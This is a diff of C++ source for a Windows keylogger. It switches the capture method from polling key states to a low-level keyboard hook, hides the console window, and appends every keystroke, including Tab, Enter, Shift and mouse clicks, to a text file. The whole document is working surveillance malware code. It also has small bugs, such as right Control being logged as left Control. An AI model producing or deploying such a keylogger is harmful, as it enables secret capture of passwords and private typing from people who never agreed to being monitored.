@@ -1,97 +1,91 @@
 #define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output file location
-#define KEY_PRESSED -32767
+#define VIRTUAL_KEY_CODE key->vkCode
 #include <iostream>
-#include <cstdio>
 #include <Windows.h>
-#include <time.h>
 #include <fstream>
-void hideConsole();
-void showConsole();
-void saveToFile(int key_ascii);
+HHOOK keyboardHook;
+void hide();
+void show();
+void saveToFile(DWORD key);
+LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 int main()
 {
-	hideConsole();
-	while (true)
+	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
+	hide();
+	MSG Msg;
+	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
 	{
-		Sleep(20);
-		for (char i = 8; i <= 255; i++)
-			if (GetAsyncKeyState(i) == KEY_PRESSED) // catch keystrokes
-			{
-				if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
-					i = tolower(i);
-				saveToFile(i);
-			}
+			TranslateMessage(&Msg);
+			DispatchMessage(&Msg);
 	}
 }
 
-void saveToFile(int key_ascii)
+void saveToFile(DWORD key)
 {
-	Sleep(20);
 	FILE* OUTPUT_FILE;
 	OUTPUT_FILE = fopen(PATH, "a+");
 	if (OUTPUT_FILE == NULL)
 	{
-		showConsole();
-		std::cout << "Error: cannot open file " << PATH;
+		exit(0);
 	}
-	switch (key_ascii)
+	else if (key == VK_ESCAPE)
 	{
-	case VK_ESCAPE:
 		exit(1);
-		break;
-	case VK_TAB:
+		UnhookWindowsHookEx(keyboardHook);
+	}
+	else if (key == VK_TAB)
 		fprintf(OUTPUT_FILE, "%s", "[TAB]");
-		break;
-	case VK_SPACE:
+	else if (key == VK_SPACE)
 		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
-		break;
-	case VK_RETURN:
+	else if (key == VK_RETURN)
 		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
-		break;
-	case VK_BACK:
+	else if (key == VK_BACK)
 		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
-		break;
-	case VK_DELETE:
+	else if (key == VK_DELETE)
 		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
-		break;
-	case VK_LCONTROL:
+	else if (key == VK_LCONTROL)
 		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
-		break;
-	case VK_RCONTROL:
-		fprintf(OUTPUT_FILE, "%s", "[RIGHT CONTROL]");
-		break;
-	case VK_LSHIFT:
+	else if (key == VK_RCONTROL)
+		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
+	else if (key == VK_LSHIFT)
 		fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT]");
-		break;
-	case VK_RSHIFT:
+	else if (key == VK_RSHIFT)
 		fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT]");
-		break;
-	case VK_CAPITAL:
+	else if (key == VK_CAPITAL)
+	{
 		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
 			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK ON]");
 		else
 			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK OFF]");
-		break;
-	case VK_LBUTTON:
-		fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
-		break;
-	case VK_RBUTTON:
-		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
-		break;
-	default:
-		fprintf(OUTPUT_FILE, "%s", &key_ascii);
-		break;
 	}
+	else if (key == VK_LBUTTON)
+		fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
+	else if (key == VK_RBUTTON)
+		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
+	else
+		fprintf(OUTPUT_FILE, "%s", &key);
 	fclose(OUTPUT_FILE);
 }
 
-void hideConsole()
+LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
+	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
+	{
+		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
+			VIRTUAL_KEY_CODE = char(tolower(VIRTUAL_KEY_CODE));
+		saveToFile(VIRTUAL_KEY_CODE);
+				
+	}
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+void hide()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 }
 
-void showConsole()
+void show()
 {
 	ShowWindow(GetConsoleWindow(), SW_SHOW);
 }
